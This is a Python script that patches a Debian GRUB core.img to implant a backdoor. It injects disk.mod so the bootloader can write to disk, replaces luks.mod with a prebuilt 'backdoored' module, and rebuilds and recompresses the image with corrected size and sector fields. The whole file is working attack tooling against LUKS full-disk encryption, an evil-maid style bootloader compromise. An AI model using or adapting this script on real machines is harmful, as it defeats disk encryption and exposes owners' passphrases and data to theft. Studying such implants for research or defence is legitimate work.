#!/usr/bin/env python
import os.path
from utils import cmd, parse_grub_modules, find_image_in_blob, GrubModule
import struct
from constants import PATCHED_CORE, KERNEL, PATCHED_MODULES_DECOMPRESSED, PATCHED_MODULES_COMPRESSED, SECTOR_SIZE, MODULE_DIR


def patch_diskboot_img() -> None:
    print("Patching diskboot image")
    patched_core_size = os.path.getsize(PATCHED_CORE)
    _, size_diskboot_img = find_image_in_blob(PATCHED_CORE, "diskboot.img", 6)
    # TODO: this needs more explanation
    sectors_after_diskboot_img = patched_core_size - size_diskboot_img + SECTOR_SIZE - 1 >> 9
    with open(PATCHED_CORE, "r+b") as f:
        f.seek(0x01fc)
        f.write(struct.pack("<H", sectors_after_diskboot_img))
    print(f"Patched sector length: we need {hex(sectors_after_diskboot_img)} sectors")


def patch_decompress_img() -> None:
    print("Patching decompress image")
    size_compressed = os.path.getsize(PATCHED_MODULES_COMPRESSED)
    size_decompressed = os.path.getsize(PATCHED_MODULES_DECOMPRESSED)
    print(f"compressed_size={hex(size_compressed)} decompressed_size={hex(size_decompressed)}")
    offset, _ = find_image_in_blob(PATCHED_CORE, "lzma_decompress.img", 6)
    with open(PATCHED_CORE, "r+b") as f:
        f.seek(offset + 8)
        f.write(struct.pack("<I", size_compressed))
        f.write(struct.pack("<I", size_decompressed))
    print(f"Done patching decompress image in {PATCHED_CORE}")


def backdoor_grub_modules() -> list[GrubModule]:
    print("Backdooring grub modules")
    kernel_size = os.path.getsize(KERNEL)
    # 12 bytes is the length of grub_module_info32 which comes after the kernel
    modules = parse_grub_modules(kernel_size + 3*4)

    # we need to load disk.mod during boot as it provides the grub_disk_write function
    # it needs to be the first module loaded (don't know why)
    # loading it just before the luks.mod didn't work
    with open(f"{MODULE_DIR}/mods-debian11/disk.mod", "rb") as f:
        disk_mod = f.read()
    module_size = len(disk_mod) + 8
    modules.insert(0, GrubModule(type=0, size=module_size, content=disk_mod))
    print("Loaded 'mods-debian11/disk.mod' and added it as first module")

    print("Replacing luks.mod with malicious one")
    for i in range(len(modules)):
        if "luks.mod" in modules[i].filename:
            break
    assert i != 0
    assert i != len(modules)
    with open(f"{MODULE_DIR}/mods-patched/luks-backdoored-working-build-on-debian.mod", "rb") as f:
        luks_mod_patched = f.read()
    module_size = len(luks_mod_patched) + 8
    modules[i] = GrubModule(type=0, size=module_size, content=luks_mod_patched)
    return modules


def build_compressed_blob(modules):
    with open(KERNEL, "rb") as f:
        kernel = f.read()

    modules_blob = b""
    for module in modules:
        modules_blob += module.serialize()

    print(f"Creating {PATCHED_MODULES_DECOMPRESSED}'")
    with open(PATCHED_MODULES_DECOMPRESSED, "wb") as f:
        f.write(kernel)
        # write grub_module_info32
        f.write(struct.pack("<I", 0x676d696d))
        f.write(struct.pack("<I", 3*4))
        f.write(struct.pack("<I", len(modules_blob)))
        f.write(modules_blob)

    print(f"Creating {PATCHED_MODULES_COMPRESSED}'")
    cmd(f"xz -z --lzma1 --format=raw < {PATCHED_MODULES_DECOMPRESSED} > {PATCHED_MODULES_COMPRESSED}")


def build_core_image():
    with open(f"{MODULE_DIR}/mods-debian11/diskboot.img", "rb") as f:
        diskboot_img = f.read()

    with open(f"{MODULE_DIR}/mods-debian11/lzma_decompress.img", "rb") as f:
        lzma_decompress_img = f.read()

    with open(PATCHED_MODULES_COMPRESSED, "rb") as f:
        patched_compressed_blob = f.read()

    with open(PATCHED_CORE, "wb") as f:
        f.write(diskboot_img)
        f.write(lzma_decompress_img)
        f.write(patched_compressed_blob)


if __name__ == '__main__':
    print("You first have to run `python analyze-core.py <core.img>* to backdoor <core.img>")
    modules = backdoor_grub_modules()
    build_compressed_blob(modules)
    build_core_image()
    patch_diskboot_img()
    patch_decompress_img()
